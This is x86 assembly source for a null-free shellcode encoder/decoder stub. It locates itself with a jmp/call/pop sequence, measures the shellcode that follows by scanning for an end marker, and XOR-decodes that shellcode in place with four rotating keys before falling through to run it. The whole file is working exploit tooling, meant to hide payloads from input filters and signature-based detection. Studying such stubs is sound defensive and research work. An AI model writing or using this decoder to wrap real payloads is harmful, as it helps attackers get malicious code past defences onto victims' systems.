
[BITS 32]

;begin starts null-free instructions to find instruction pointer
begin:
	jmp pic_begin

begin2:
	jmp header_start

pic_begin:
	call begin2

header_start:
	pop eax ;Holds pic address of code
	sub eax, 0x9 ;Adjust for beginning of jmp/jmp/call nonsense
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

get_start_shellcode:
	jmp start_shellcode
got_start_shellcode:
	pop ebx ;ebx holds start of shellcode

find_end:
	mov edx, [ebx+ecx]
	cmp edx, 0xddccbbaa ;end of shellcode bytes
	je start_encoding
	inc ecx
	jmp find_end


; got_length, ecx holds length of shellcode
start_encoding:
	mov esi, ebx ;put beginning of shellcode into esi, ebx will be overwritten
	dec ecx
	dec ecx
	dec ecx ;decrease length of shellcode by 3 because each XOR operation applies to dword from address (current + 3 bytes), also non-null bytes
start_encoding_loop:
	mov edx, [esi]
	mov ebx, eax
	db 0x83, 0xc3, 0x73 ;add ebx, key1 -- this value will need to be changed if the header changes size
	xor edx, [ebx]
	mov [esi], edx
	inc esi
	dec ecx
	test ecx, ecx
	je actual_start_shellcode
	mov edx, [esi]
	mov ebx, eax
	db 0x83, 0xc3, 0x77 ;add ebx, key2 -- this value will need to be changed if the header changes size
	xor edx, [ebx]
	mov [esi], edx
	inc esi
	dec ecx
	test ecx, ecx
	je actual_start_shellcode
	mov edx, [esi]
	mov ebx, eax
	db 0x83, 0xc3, 0x7b ;add ebx, key3 -- this value will need to be changed if the header changes size
	xor edx, [ebx]
	mov [esi], edx
	inc esi
	dec ecx
	test ecx, ecx
	je actual_start_shellcode
	mov edx, [esi]
	mov ebx, eax
	db 0x83, 0xc3, 0x7f ;add ebx, key4 -- this value will need to be changed if the header changes size
	xor edx, [ebx]
	mov [esi], edx
	inc esi
	dec ecx
	test ecx, ecx
	je actual_start_shellcode
	jmp start_encoding_loop

key1:
	dd 0x12233445

key2:
	dd 0x9944aa72

key3:
	dd 0xbccddeef

key4:
	dd 0xaaaaaaaa

start_shellcode:
	call got_start_shellcode

actual_start_shellcode: